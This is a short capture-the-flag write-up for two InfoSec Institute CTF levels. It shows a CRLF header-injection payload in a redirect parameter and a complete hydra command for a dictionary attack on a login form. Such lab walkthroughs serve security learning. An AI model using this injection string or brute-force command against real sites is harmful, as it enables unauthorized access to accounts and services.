# InfoSecInstituteCTF
I wanted to go from the hardest but anyway the order is mixed

# Level13
Try adding a remote URL in the appropriate GET parameter

It's pretty strange that level13 leads to ex13-task.php, while others lead to ex#.php :)
Lets visit exp13.php
"Get a Hint"

Lets try few tricks :


http://ctf.infosecinstitute.com/ctf2/exercises/ex13-task.php?redirect=test


Nothing


http://ctf.infosecinstitute.com/ctf2/exercises/ex13.php?redirect=test


Bingo :)
Now we have to inject the header :


http://ctf.infosecinstitute.com/ctf2/exercises/ex13.php?redirect=%0d%0a%20CostumHeader:INJECTED



# Level12


This was a very easy one, dictionary attack on POST request, lets hit hydra :)


https://i.imgur.com/pzbvkWd.png


Command:


hydra ctf.infosecinstitute.com http-form-post"/ctf2/exercises/ex12.php:username=^USER^&password=^PASS^&logIn=Login:combination" -L users.txt -P password.txt -t 10 -w 30 -o hydra-http-post-attack.txt

